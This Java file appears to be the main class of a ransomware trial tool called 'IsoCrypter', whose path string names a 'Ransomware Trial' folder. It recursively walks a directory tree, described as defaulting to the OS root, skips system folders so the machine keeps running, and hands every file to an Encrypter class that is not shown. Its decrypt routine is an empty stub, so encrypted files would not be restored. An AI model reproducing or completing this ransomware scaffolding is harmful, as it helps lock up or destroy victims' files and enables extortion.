package com.iso53;

import org.apache.commons.cli.*;

import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashSet;

class App {

    private static String PATH;
    private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;

    public static void main(String[] args) {
        PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial\\Fullstack-Auction-Website";
        CURR_OS_EXCLUDED_FOLDERS = OS.getCurrentOS() == OS.WINDOWS ? OS.Windows.getExcludedFolders() : OS.Linux.getExcludedFolders();

        Options options = new Options();
        initOptions(options);
        parseOptions(options, args);
    }

    public static void traverseAndEncrypt(File[] files) {
        if (files == null) {
            return;
        }

        for (File file : files) {
            if (file.isDirectory()) {
                if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
                    traverseAndEncrypt(file.listFiles());
                }
            } else {
                System.out.println("File: " + file.getAbsolutePath());
                Encrypter encrypter = new Encrypter(file.toPath(), Encrypter.FILE);
                encrypter.run();
            }
        }
    }

    public static void traverseAndDecrypt(File[] files, SecretKey key) {
        if (files == null) {
            return;
        }

        for (File file : files) {
            if (file.isDirectory()) {
                if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
                    // System.out.println("Directory: " + file.getAbsolutePath());
                    traverseAndDecrypt(file.listFiles(), key);
                }
            } else {
                // System.out.println("File: " + file.getAbsolutePath());
            }
        }
    }

    private static void initOptions(Options options) {
        options.addOption("h", "help", false, "Prints help message.");
        options.addOption(Option
                .builder("p")
                .longOpt("path")
                .desc("Specify the path the program should run. Default is the root path of the OS.")
                .hasArg()
                .argName("path")
                .build());
        options.addOption("e", "encrypt", false, "Encrypts all the files in the specified path.");
        options.addOption(Option
                .builder("d")
                .longOpt("decrypt")
                .desc("Decrypts all the files in the specified path.")
                .hasArg()
                .argName("key")
                .build());
    }

    private static void parseOptions(Options options, String[] args) {
        // Parse the command line arguments
        CommandLineParser parser = new DefaultParser();
        try {
            CommandLine cmd = parser.parse(options, args);

            if (cmd.hasOption("help")) {
                HelpFormatter helpFormatter = new HelpFormatter();
                helpFormatter.printHelp("IsoCrypter", options);
                return;
            }

            if (cmd.hasOption("path")) {
                String inputStringPath = cmd.getOptionValue("path");
                Path inputPath = Paths.get(inputStringPath);

                if (!Files.exists(inputPath)) {
                    System.out.println("This path is invalid.");
                    return;
                }

                if (!Files.isDirectory(inputPath)) {
                    System.out.println("This path is not a directory.");
                    return;
                }

                PATH = inputStringPath;
            }

            if (cmd.hasOption("decrypt")) {
                String stringKey = cmd.getOptionValue("decrypt");
                SecretKey key = new SecretKeySpec(stringKey.getBytes(StandardCharsets.UTF_8), "AES");
                traverseAndDecrypt(new File(PATH).listFiles(), key);
                return;
            }

            if (cmd.hasOption("encrypt")) {
                traverseAndEncrypt(new File(PATH).listFiles());
            }
        } catch (MissingArgumentException e) {
            System.out.println("Missing argument.");
        } catch (ParseException e) {
            System.out.println("Parsing error.");
        }
    }
}